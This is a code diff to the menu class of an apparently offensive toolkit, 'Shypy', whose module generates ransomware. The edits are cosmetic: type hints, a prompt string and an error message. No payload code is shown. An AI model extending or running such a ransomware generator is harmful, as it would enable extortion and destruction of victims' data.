@@ -13,8 +13,8 @@ class RansomwareGenerator(ModuleUtils):
         Constructor method for the Generator class.
         """
         super().__init__()
-        self.module  = "ransomware"
-        self.payload = ""
+        self.module  : str = "ransomware"
+        self.payload : str = ""
         
     def run(self) -> None:
         """
@@ -44,7 +44,7 @@ class RansomwareGenerator(ModuleUtils):
             ╚══════════════════════════════════════════════════════════════════════════╝
             \n\n""")
         
-        answer = input(f"{COLOR['CYAN']}Shypy >>{COLOR['RESET']} ").lower().strip()
+        answer = input(f"{COLOR['CYAN']}{FLAG}{COLOR['RESET']}").lower().strip()
         
         if answer == "generate":
             if self.payload == "":
@@ -77,5 +77,5 @@ class RansomwareGenerator(ModuleUtils):
             importlib.import_module("main").Shypy().menu()
 
         else:
-            self.write(message="Invalid Option", level=4, delay=1, clear=False)
+            self.write(message="Invalid Option.", level=4, delay=1, clear=False)
             self.run()
